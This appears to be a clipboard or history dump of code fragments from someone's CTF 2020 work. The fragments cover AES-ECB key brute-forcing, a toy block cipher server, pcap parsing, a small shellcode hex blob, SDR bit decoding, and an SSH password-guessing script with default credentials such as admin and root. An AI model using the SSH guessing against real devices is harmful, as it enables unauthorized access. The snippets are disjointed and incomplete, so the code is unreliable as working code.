69bd0805871c75674655ec9933ed27b8|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|6|9|v|python
	b'\x82\xf8\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	# Key2: b'\xb3\x14\xb9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	# Middle: 11bf8aac04c8a0ad90d208a5ca1654a27d45fd6102f72b044b0f8143e6d4d41f6735455ec208e18a5ad6df864d3992124833a7098378cea7c1ea6b5393c8427a
	# Ciphertext: 6168eba6692c25564c27e294613a51683bc8e8a2005813b69c1253a3127d0fa0296346ddf2e50e5d08283d87c1555b21c24250476e174f3b8ba6d3b1d0f85635
	
	pad = lambda s: s + b'\x00' * (BS - len(s) % BS)
	blockify = lambda inpt, size, pad: [inpt[i:i+size].ljust(size, pad) for i in range(0, len(inpt), size)]
	
	BS = AES.block_size
	# CT_HEX = "1ae4c56852fde8ca7ec9823587550aa2be3c839caa0a565c6a299e7a5e2cc9998302960abc778ba3ee3c8ad0518b1edae12e4a387fbfcfa25e7b0e249a17ff61"
	CT_HEX = "6168eba6692c25564c27e294613a51683bc8e8a2005813b69c1253a3127d0fa0296346ddf2e50e5d08283d87c1555b21c24250476e174f3b8ba6d3b1d0f85635"
	CT = bytes.fromhex(CT_HEX)
	ct_blocks = blockify(CT, BS, b'\x00')
	ASSUMED_BLOCK = 
f928102efa3e53be33bf763a7efbbb41|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|7|9|v|python
	b'\xb3\x14\xb9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
543809cab5b98a214c5d336f671c2ecf|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|43|29|v|python
	\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
a39d984d249ee7e911d3dfb657054501|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|31|1|V|python
	    key = b'\xb3\x14\xb9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
394bdb58ca2e796fd820d0c6be9b4f2d|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|25|5|V|python
	    key = b'\x82\xf8\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
434571b78fabdd8f4708b394d89a9827|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|34|12|v|python
	c1.decrypt(ct_blocks[0]).hex()
ac663cc3562462b0d0e22f1da0a01881|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|32|1|V|python
	    c1 = AES.new(key, AES.MODE_ECB)
ade0a42b1c53163a4e5d8133c5236a7d|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|36|5|V|python
	    cipher = 
8e18a0447838c2e181edada40449557e|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|19|19|v|python
	The flag is FLAG-
08c7eaf46a739176e07a853f62f62e96|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|16|1|V|python
	CT_HEX = "6168eba6692c25564c27e294613a51683bc8e8a2005813b69c1253a3127d0fa0296346ddf2e50e5d08283d87c1555b21c24250476e174f3b8ba6d3b1d0f85635"
30f7db55c0954030c93d12f9930d71ee|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|48|1|V|python
	print(encrypt(1))
	print(decrypt(1))
68690daf99fecb8acc53bad329303ef5|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|31|9|V|python
	    key = b'\x82\xf8\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	    c1 = AES.new(key, AES.MODE_ECB)
	    print(c1.decrypt(bytes.fromhex(ret)))
92051b9a18f1d43b5a5316f13e03e7f0|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|30|5|V|python
	    ret = c1.decrypt(ct_blocks[0]).hex()
25f7d04fa093365cc3a22ff110581d13|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|19|1|V|python
	ASSUMED_BLOCK = b"/home/malcolm/FLAG-"[:BS]
c083af4802d8cad18f83d6341cc7aa48|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|20|45|v|python
	/home/malcolm/FLAG-
345540a5db2e82ab3fe594629d3f9cb3|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|39|12|v|python
	possible_
b4630129c8a20c6e4b60d8e0b536f64c|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/malcolm.py|24|10|v|python
	'Well done! your flag is: <redacted>'
a3972f128ec92f9badce297374bc6c69|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|21|44|v|python
	<redacted>'
c89cb4083a11f6ff24200cbfeebb4e76|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|22|1|V|python
	print(ASSUMED_BLOCK)
9c970b8930ba4a2ad7ab3d0794501f1e|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|22|1|V|python
	print(ct_blocks[0])
ceb294418165377b273210a5fa44ab22|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|19|1|V|python
	# ASSUMED_BLOCK = b"/home/malcolm/FLAG-"[:BS]
ac2117c4bf6053d11842755bde172b3f|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|19|1|V|python
	ASSUMED_BLOCK = b"/home/neo/CTFs/spiderlabsc"[:BS]
15eb6746f781c24af835f85685106e65|file:///home/neo/cyberranges/work/rsa/server.py|11|1|V|python
	ROUNDS = 4
	BLOCK_SIZE = 8
	
	sbox = [77, 100, 87, 71, 69, 66, 3, 210, 13, 104, 78, 79, 65, 106, 91, 203, 86, 84, 215, 82, 25, 80, 81, 88, 95, 94, 111, 222, 73, 24, 67, 74, 103, 108, 102, 70, 35, 97, 99, 98, 45, 92, 125, 110, 41, 168, 107, 105, 116, 117, 115, 118, 113, 112, 85, 114, 93, 124, 253, 127, 89, 216, 75, 126, 101, 16, 38, 6, 5, 96, 1, 19, 11, 76, 15, 2, 10, 64, 59, 72, 21, 20, 22, 18, 17, 177, 27, 83, 23, 28, 63, 14, 9, 154, 31, 90, 37, 4, 39, 32, 33, 224, 43, 34, 109, 44, 47, 46, 40, 36, 42, 130, 53, 52, 151, 54, 49, 48, 55, 50, 121, 60, 191, 62, 123, 56, 58, 120, 205, 229, 199, 228, 193, 68, 195, 194, 141, 204, 239, 236, 192, 233, 207, 238, 221, 196, 197, 198, 209, 144, 211, 208, 217, 220, 223, 158, 201, 218, 139, 26, 165, 164, 243, 230, 225, 226, 231, 242, 173, 252, 255, 206, 235, 232, 227, 202, 245, 212, 246, 214, 241, 240, 145, 182, 237, 188, 119, 254, 249, 248, 122, 250, 129, 148, 167, 132, 163, 0, 7, 131, 133, 12, 159, 134, 137, 200, 219, 138, 149, 140, 135, 150, 136, 152, 147, 146, 157, 29, 143, 156, 153, 8, 155, 187, 180, 162, 175, 166, 181, 128, 51, 170, 169, 172, 174, 142, 161, 160, 171, 234, 213, 244, 179, 190, 185, 176, 183, 178, 189, 184, 247, 30, 57, 61, 251, 186]
	perm = [1, 57, 6, 31, 30, 7, 26, 45, 21, 19, 63, 48, 41, 2, 0, 3, 4, 15, 43, 16, 62, 49, 55, 53, 50, 25, 47, 32, 14, 38, 60, 13, 10, 23, 35, 36, 22, 52, 51, 28, 18, 39, 58, 42, 8, 20, 33, 27, 37, 11, 12, 56, 34, 29, 46, 24, 59, 54, 44, 5, 40, 9, 61, 17]
	key = open("flag.txt", "rb").read().strip()
825c1692531352ae31858f1f1aad1e51|file:///home/neo/cyberranges/work/rsa/server.py|14|1|V|python
	    def key_expansion(self, key):
	        keys = [None] * 4
	        keys[0] = key[0:4] + key[12:16]
	        keys[1] = key[4:8] + key[8:12]
	        keys[2] = key[4:8] + key[8:12]
	        keys[3] = key[0:4] + key[12:16]
	        return keys
9eb7280afe4ad51e3d4e1a1085aba897|file:///home/neo/cyberranges/work/rsa/server.py|14|1|V|python
	    def apply_sbox(self, pt):
	        ct = b''
	        for byte in pt:
	            ct += bytes([sbox[byte]])
	        return ct
	
	    def apply_perm(self, pt):
	        pt = bin(int.from_bytes(pt, 'big'))[2:].zfill(64)
	        ct = [None] * 64
	        for i, c in enumerate(pt):
	            ct[perm[i]] = c
	        return bytes([int(''.join(ct[i : i + 8]), 2) for i in range(0, len(ct), 8)])
	
	    def apply_key(self, pt, key):
	        ct = b''
	        for a, b in zip(pt, key):
	            ct += bytes([a ^ b])
	        return ct
	
66e36a5d2e17adb61076f0674ec5a207|file:///home/neo/cyberranges/work/rsa/server.py|15|1|V|python
	        keys = self.key_expansion(key)
	        for i in range(65536):
	            pt = os.urandom(8)
	            ct = pt
	            for i in range(ROUNDS):
	                ct = self.apply_sbox(ct)
	                ct = self.apply_perm(ct)
	                ct = self.apply_key(ct, keys[i])
96b5d79672cf01d88525aba3f4852345|file:///home/neo/cyberranges/work/rsa/server.py|15|28|v|python
	int.from_bytes(pt, 'big'), int.from_bytes(ct, 'big')
7a6bf27a0a10a99e074d4188408dba11|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|39|18|v|python
	tqdm.tqdm(pool.imap_unordered(encrypt, range(0xFFFFFF)), total=0xFFFFFF):
5f6f5d99fbcf5d5c555bd976de095241|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|19|13|v|python
	629ebe03d08600144418b6957f4487ee
3d72f73fa74647c6a15351850261ed81|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|32|23|v|python
	ct_blocks[0]
9ec031dd9394932d1a11a82d7968d066|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|30|5|V|python
	    key = b'\xda\x0c\xd4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
2cb081800f441b7407b6f90b70e30104|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|36|7|v|python
	for dec in tqdm.tqdm(pool.imap_unordered(decrypt, range(0xFFFFFF)), total=0xFFFFFF):
da2273b34a6dff9921f9f38bdeba9720|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|33|1|V|python
	print(bytes.fromhex(decrypt(1)))
cfbac2084279bc0bb0154905bc460af9|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|32|12|v|python
	c1.decrypt(CT).hex()
7cff77587b89049697608692eb91ee26|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|31|28|V|python
	    ctext =c1.decrypt(CT).hex() 
	    return 
40307a442235770ac2e6dc2ee44fa669|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|32|5|V|python
	    return 
8ed5b7469a7b98f6bd3eb506bf8197fd|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|29|11|v|python
	pad(pack('<I', key))
dd79c0ee330b9d25f151c2c944ad55a6|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|43|10|v|python
	13896922
77a05b9de5fc5015e93c87690b46332c|file:///home/neo/CTFs/spiderlabsctf2020/malcolm/rokos.py|43|1|V|python
	print(key1)
6ab730bafe47b9617356a676581bd12a|file:///home/neo/ccsc/abnormal/gethttp.py|4|16|v|python
	examine
42016f5b1b74986968bd2deb650dbbf8|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/parser.py|188|1|V|python
	    if len(arguments) == 5:
	        if arguments[1] == "--inputpcap" and arguments[3] == "--stripurl":
	            stripurl_pcap(arguments[2], arguments[4])
	        elif arguments[1] == "--inputpcap" and arguments[3] == "--stripimg":
	            stripimg_pcap(arguments[2], arguments[4])
	        elif arguments[1] == "--inputpcap" and arguments[3] == "--striptxt":
	            striptxt_pcap(arguments[2], arguments[4])
	        elif arguments[1] == "--iface" and arguments[3] == "--stripurl":
	            stripurl_sniff(arguments[2], arguments[4])
	        elif arguments[1] == "--iface" and arguments[3] == "--striptxt":
	            striptxt_sniff(arguments[2], arguments[4])
	        else:
	            usage()
	    else:
	        usage()
a72b81ff260640a51d1d6b41754b0d52|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/parser.py|193|1|V|python
	    #     elif arguments[1] == "--inputpcap" and arguments[3] == "--striptxt":
1a2916bb50e76b2461f3e93090785334|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/parser.py|199|1|V|python
	    #         striptxt_sniff(arguments[2], arguments[4])
80791b3ae7002cb88c246876d9faa8f8|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|6|9|v|python
	http
a6219c71e73beed048b4d8d60ad06222|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|8|9|V|python
	sessions = a.sessions()
	print(sessions)
c4805ef57db88b9394cad5aeeb5784f1|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|6|1|V|python
	data = "http.pcapng"
72fa9d36ad9fb42f76c99ff45714745c|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|8|1|V|python
	# i = 1
	# for session in sessions:
	#     http_payload = ""
	#     for packet in sessions[session]:
	#         try:
	#             if packet[TCP].dport == 8000 or packet[TCP].sport == 8000:
	#                 print packet
	#         except:
	#             pass
	
	
	
5fac53e0efa80b1f13c2c799e2fceb27|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|2|5|V|python
	#os.system("tshark  -T fields  -e frame.time -e  data.data -w Eavesdrop_Data.pcap > Eavesdrop_Data.txt -F pcap -c 1000")
	#I commented out the t-shark so i could just reuse the same data
8b5f8b4aad7e5268425595f2988e2247|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/gethttp.py|14|1|V|python
	            headers_raw = http_payload[:http_payload.index("\r\n\r\n") + 2]
5b149fa3e25037b369c29f7fdfc232c1|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|8|5|v|python
	headers_raw
171ce5c15264ae75679b8f985794e180|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|8|12|v|python
	http_payload
548ecd85b69dd271e2fa5120d5c7d7b3|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|7|5|V|python
	    print(packet)
dda8115d67f2d8d73788715ca7e032c3|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/gethttp.py|8|1|V|python
	client_packets = PacketList([p for p in packets if p[IP].src == '192.168.220.244' and Raw in p])
	server_packets = PacketList([p for p in packets if p[IP].src == '192.168.197.131' and Raw in p])
fdb0a087491209f769ba8a5752f50788|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|8|1|V|python
	print(client_packets)
a4ebbfadf78740e985b4512ba256ac8a|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/gethttp.py|5|1|V|python
	pcap = defragment(pcap)
	packets = [p for p in pcap if Raw in p]
c9c17db3d29de9a4d3525da0f2bdfe20|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|4|1|v|python
	packets
5dffbfe100092c548f8b5e674e38ec02|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|12|4|V|python
	    packet = packet.
a2c9df3b73ccb8a7acc0ce6a161ff822|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|12|5|V|python
	    print(packet.load)
6a3644a9c500152a5063a022314730d9|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|13|5|V|python
	    body = packet[packet.index("\r\n\r\n") + 2:]
7f0d4df5212828777440bb9fd95a55a9|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|13|5|V|python
	    print(body)
d621a6972be8cc67d8b857e903e2e5ce|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|17|9|V|python
	        print(body)
49ddd1b7694a6cfaaa96604d18f43b6c|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|11|5|V|python
	    print("Packet %d:" % i)
e5c20007844c933b2eff81b2917c8035|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|14|5|V|python
	        print(payload)
247f140eb2d97a5a818842f3392d32ef|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|14|29|v|python
	dumps
6eb6b2a2a04ac2ea7102abc0e282ef5c|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|15|9|V|python
	        print(json_payload['Data'])
82a8c13dd05fa6f2bc8dc5bf033be32d|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|14|9|v|python
	json_payload
832ab3bafe9da2cdf326f0b3f9702ead|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|15|9|V|python
	        data = 
9469435b64d32c895cf17ee2d2257f77|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|10|1|V|python
	print("Client packets data:")
	for i,packet in enumerate(client_packets):
	    body = str(packet.payload)
	    try:
	        payload = body[body.index('{'):][:-1]
	        packet_data = json.loads(payload)['Data']
	        if packet_data != '':
	            print(packet_data)
	    except:
	        pass
577d7068826de925ea2aec01dbadf5e4|file:///home/neo/CTFs/spiderlabsctf2020/malicious-traffic/scan.py|21|8|v|python
	Client
ba957614f7ad6c84af1bf33c2ef29553|file:///home/neo/CTFs/spiderlabsctf2020/linkineedyou/test.hex|2|9|^v|hex
	41c1a18c8e978a979fd39f8d93d39a8b9
af1243da14ec485c09c6fb54be8cff17|file:///home/neo/CTFs/spiderlabsctf2020/linkineedyou/test.hex|2|13|^v|hex
	a18c8e978a979fd39f8d93d39a8b92a15
2826c2692799f375d3c92c9196f952e8|file:///home/neo/CTFs/spiderlabsctf2020/linkineedyou/test.hex|1|55|^v|hex
	4831c0
115901f9374a74333654f74d0a853410|file:///home/neo/CTFs/spiderlabsctf2020/linkineedyou/test.hex|1|55|^v|hex
	b03c0f0541c1a18c8e978a979fd39f8d93d39a8b92a15
af6e709c1e658133f51dcca34e1ef03a|file:///home/neo/CTFs/spiderlabsctf2020/linkineedyou/test.hex|1|1|^v|hex
	8d05faffffff040affe04889e348c1eb104881f3ffffff7fcc75194831c0b03c0f0541c1a18c8e978a979fd39f8d93d39a8b92a15
52e1cfa080d48f95b34d06595fa338f3|file:///home/neo/CTFs/spiderlabsctf2020/iot/ssh-fmt.py|39|9|V|python
	    if argc == 2:
	        password_file = str( sys.argv[1] )
	        with codecs.open(
	            filename = password_file,
	            mode = 'rb',
	            encoding = 'utf-8',
	            errors = 'ignore'
	            ) as f:
	            passwords = [ word.strip() for word in f.readlines() ]
09b3f83434b3c6046ddfd03c3f3a86ba|file:///home/neo/CTFs/spiderlabsctf2020/iot/ssh-fmt.py|38|5|V|python
	    argc = len( sys.argv )
756e533f4b49336a21336d1c30889b03|file:///home/neo/CTFs/spiderlabsctf2020/iot/ssh-fmt.py|38|5|V|python
	    else:
	        passwords = ['admin', 'test', 'guest', 'admin123', 'root']
1ffa6afae980d20b989794057fdf02ce|file:///home/neo/CTFs/spiderlabsctf2020/iot/ssh-fmt.py|37|1|V|python
	    
	
cbe423e0b8b1cc73d1e32e939adfccee|file:///home/neo/CTFs/spiderlabsctf2020/iot/ssh-fmt.py|29|1|V|python
	5802cf35
23121146fbf25064e1d42ea9574a1a7a|file:///home/neo/CTFs/spiderlabsctf2020/iot/ssh-fmt.py|31|5|V|python
	    print( i, '=>', r )
de00eb1565f6b97a00fc7b42c31601ac|untitled:1|1|1|V|
	2.07815e+12, 2.55252e+12, 1.06637e+13, 8.00515e+12, 4.5793e+13, 2.7298e+12, 2.59543e+12, 9.33612e+12, 8.95306e+12, 2.69153e+12, 2.98158e+12, 1.29224e+13, 2.07349e+13, 2.51339e+13, 2.32851e+12, 6.46533e+13, 3.05449e+13, 7.45844e+13, 2.4803e+12, 2.186e+12, 2.54514e+12, 2.70537e+13, 2.25072e+12, 2.2687e+12, 3.68375e+13, 2.66029e+12, 2.51291e+12, 8.37904e+12, 8.55448e+13, 2.51118e+12, 2.5627e+13, 2.56427e+12, 2.8454e+12, 1.79435e+13, 2.03375e+13, 8.21576e+12, 2.56782e+12, 2.63312e+12, 5.83596e+13, 1.18527e+14, 1.19171e+13, 8.25514e+12, 2.87195e+12, 1.14726e+13, 2.58558e+12, 2.31755e+12, 1.48994e+13, 1.69988e+13, 2.29379e+12, 7.20108e+12, 2.62535e+12, 2.74232e+12, 3.07571e+13, 2.63162e+13, 2.93736e+12, 2.79142e+12, 2.5458e+12, 2.81445e+12, 2.26661e+12, 2.50032e+12, 2.92721e+12, 
	
423b244fc8357db65f984af718f0cb88|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|10|1|V|python
	print(pt)
	print(len(pt))
5f0ddab80a26f87f11334a53edad19b6|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1.00848, 1.28584, 0.958696, -1.05967, -1.04887, 1.24671, -1.05534, 1.14308, -1.05963, -1.03046, 1.05515, -1.02623, 1.01265, -1.00336, -0.78904, -1.01333, 0.955522, -0.946504, 0.989928, 0.977167, 1.16358, -0.997547, 1.27098, -1.00876, 1.18837, -0.994844, 1.28423, 1.06443, -0.983791, -0.982983, -0.870075, 0.979084, -0.984112, -1.18152, 1.1088, 0.990579, 1.17391, -0.975783, -0.903424, 1.04494, -0.978522, -1.14492, 1.00311, 1.16178, 1.15949, 1.04525, 0.15253, -0.99974, 1.08513, -0.641223, -1.00752, 1.11783, -0.983733, 1.06971, 0.937176, -1.00382, 1.30915, -1.42207, -0.985815, -0.996156, -0.996991, -1.02307, -0.967844, 1.07105, -0.985658, 1.03388, -1.02866, -1.01314, 1.57534, -1.0195, -1.03017, 1.00182, 1.05707, -1.06129, 1.41398, -1.05364, -0.363745, -1.04888, -1.02335, 1.11867, 1.14565, -1.02884, -1.04141, 1.2906, -1.28428, -1.04486, 1.15884, 0.898916, 1.20654, 1.14722, -1.08245, 1.05972, -0.555809, 1.19539, 1.1013, -1.0814, 1.06464, -1.01115, 1.38344, -1.08782, 1.51449, -1.08773, 1.17485, 1.18815, -1.09099, 1.2617, 1.08919, 1.20188, -0.973955, 1.17513, 0.996899, -0.437817 ]
6abc38a47562f0bcf22f3bfd61a20e70|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|5|5|V|python
	    print(n)
ed654c795229d8523befa42cce664008|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [4.78359e+09, 2.97855e+06, 4.01796e+06, 4.43912e+09, 4.45587e+09, 2.42282e+06, 4.09741e+09, 4.25703e+09, 2.97001e+06, 4.05541e+09, 3.36881e+06, 2.96204e+06, 4.89476e+09, 4.33651e+09, 3.7587e+06, 4.41127e+06, 4.52071e+06, 5.01452e+09, 3.95295e+06, 4.42122e+09, 4.17456e+06, 2.82992e+06, 3.97177e+09, 4.65648e+09, 2.51092e+06, 3.29358e+06, 2.57819e+06, 4.18912e+09, 4.02118e+09, 4.16261e+09, 2.80383e+06, 4.50604e+09, 4.6078e+09, 3.15824e+06, 4.97966e+09, 4.95724e+09, 3.15076e+06, 3.17706e+06, 4.65449e+09, 5.2943e+09, 2.74821e+06, 3.94608e+06, 4.053e+06, 5.12214e+09, 4.25229e+09, 3.5708e+06, 4.14507e+09, 4.01297e+09, 2.1311e+06, 3.54444e+06, 4.31617e+09, 4.28911e+09, 4.82255e+06, 470555, 4.18866e+06, 1.95782e+06, 3.8483e+09, 4.87336e+09, 3.38529e+06, 4.72091e+09, 4.45024e+09, 3.50054e+06, 4.1475e+09, 6.87297e+07, 4.1854e+06, 3.98827e+09, 5.04636e+09, 2.41994e+06, 4.25366e+09, 4.57097e+09, 2.94807e+06, 3.15324e+06, 3.31023e+06, 1.13837e+09, 3.19991e+06, 5.51438e+09, 4.44586e+09, 4.09946e+06, 4.73422e+09, 4.32442e+09, 3.88623e+06, 4.92375e+09, 4.79382e+09, 4.34639e+06, 4.01259e+09, 1.9351e+06, 3.1328e+06, 4.24932e+09, 2.98608e+06, 3.64274e+06, 5.89441e+09, 4.07964e+09, 3.44296e+06, 4.53089e+09, 4.95286e+06, 4.03822e+06, 4.89148e+09, 5.76142e+09, 3.76057e+06, 4.24001e+09, 8.80778e+09, 2.79751e+06, 4.39896e+09, 1.55268e+06, 4.7723e+06, 1.32042e+06, 4.6043e+09, 4.05e+09, 2.75554e+06, 3.82931e+06, 4.54852e+09, 2.22651e+06, 5.31191e+09, 4.16747e+09, 1.57367e+06, 4.88964e+09, 4.99773e+09, 3.94237e+08, 4.81081e+09, 3.35453e+06, 1.71516e+06, 5.95549e+06, 4.63353e+09, 3.75661e+06, 4.12028e+09, 3.7819e+09, 3.26935e+06, 4.17996e+09, 3.082e+06, 3.38332e+06, 3.91316e+09, 337916, 3.59161e+06, 4.05012e+06, 4.52376e+09, 2.73303e+06, 2.76353e+06, 4.34501e+09, 3.74292e+06, 2.22502e+06, 4.57653e+09, 2.38967e+08, 3.26753e+06, 4.19186e+09, 4.6551e+09, 3.15554e+06, 4.04832e+09, 1.68952e+06, 5.62984e+09, 4.43621e+09, 3.35367e+06, 1.78581e+06, 4.18465e+09, 4.98428e+09, 4.59608e+06, 4.92186e+09, 4.80973e+09, 4.49029e+09, 3.85541e+06, 4.46704e+09, 3.44978e+06, 6.41225e+07, 4.15463e+09, 2.70872e+06, 3.26836e+06, 4.23892e+09, 2.33495e+06, 4.54955e+09, 2.062e+09, 4.31519e+06, 4.91711e+09, 5.09584e+06, 2.64216e+06, 4.60151e+09, 4.83532e+09, 2.48416e+06, 4.682e+09, 3.06643e+06, 5.89635e+09, 1.84215e+06, 4.3836e+09, 3.79483e+09, 5.54017e+09, 3.9264e+09, 3.94525e+06, 3.28796e+06, 4.35736e+09, 4.14329e+09, 1.21422e+07, 4.0849e+06, 4.3681e+06, 3.83473e+06, 6.02122e+09, 4.76596e+09, 4.47199e+09, 3.09751e+06, 2.4647e+06, 3.37266e+06, 4.3001e+09, 3.26742e+06, 4.77167e+06, 3.41207e+06, 4.46109e+09, 3.16197e+06, 2.66707e+06, 3.86276e+09, 3.30496e+06, 3.09389e+06, 3.74429e+06, 6.94405e+06, 3.09971e+06, 4.52253e+09, 4.55495e+09, 2.90091e+06, 3.78126e+06, 4.49426e+09, 5.33168e+09, 4.5236e+09, 3.68058e+06, 4.79843e+09, 3.48497e+06, 2.70235e+06, 1.11279e+07, 4.37238e+09, 2.50302e+06, 3.11007e+06, 5.38952e+09, 3.80308e+09, 5.15744e+09, 3.53319e+06]
2da62e5e8c0b59d169c28e80da94c70f|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0]
50cb302dcbc0891a3494a2fb21cf0efa|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
	nums = [1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1]
1c7682ec497b69217fbe3b42e1957e7d|file:///home/neo/CTFs/spiderlabsctf2020/sdr/solve.py|1|1|V|python
